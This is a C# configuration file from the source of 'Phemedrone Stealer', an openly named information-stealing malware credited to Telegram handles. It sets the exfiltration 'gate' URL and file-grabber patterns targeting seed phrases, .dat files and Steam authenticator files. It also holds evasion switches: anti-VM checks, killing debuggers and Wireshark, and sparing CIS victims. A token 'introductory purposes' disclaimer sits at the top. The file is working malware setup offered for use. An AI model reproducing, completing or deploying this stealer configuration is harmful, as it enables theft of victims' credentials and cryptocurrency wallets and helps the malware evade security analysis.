/*
    Phemedrone Stealer
    Coded by https://t.me/reyvortex & https://t.me/TheDyer
    !WARNING! ALL CODE IS FOR INTRODUCTORY PURPOSES WE ARE NOT RESPONSIBLE FOR WHAT YOU HAVE DONE !WARNING!
*/
using System.Collections.Generic;

namespace Phemedrone
{
    public class Config
    {
        // Gate url (localhost/phe)
        public static readonly string GateURl = "localhost/phe"; // Replace
        
        // Stealer Tag
        public static readonly string Tag = "me";
        
        // file grabber patterns (* - for any words example: *.exe If you need a specific file: filename.exe)
        public static List<string> FilePatterns = new List<string>()
        {
            "*.txt", "*seed*", "*.dat", "*.mafile",
        };
        
        public static readonly int GrabberFileSize = 5; // grabber file size (MB)
        public static readonly int GrabberDepth = 2;
        
        // Stealer Logic Settings
        public static bool AntiCIS = false; // If target is a CIS user then stealer STOPS its work
        
        public static bool AntiVm = false; // Anti Virtual Machine
        
        public static readonly string MutexValue = "BestStealer"; // a value for mutex checking (leave blank for disabling this)
        
        public static bool AntiDebug = false; // Kill Process HTTPDebugger, WireShark (Open AntiDebbuger.cs in Protections Floder to add new process)
    }
}